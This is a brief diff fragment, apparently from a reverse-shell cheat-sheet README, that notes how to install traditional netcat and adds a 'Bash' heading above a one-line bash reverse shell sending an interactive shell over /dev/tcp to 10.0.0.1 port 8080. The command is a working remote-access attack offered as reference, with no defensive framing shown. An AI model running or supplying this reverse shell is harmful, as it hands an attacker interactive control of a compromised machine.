@@ -13,6 +13,8 @@ This should work on most modern implementation of nc
 If you require to use old versions of netcat you can do so by 
 > sudo apt-get install netcat-traditional
 
+### 1. Bash
+
 
 
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
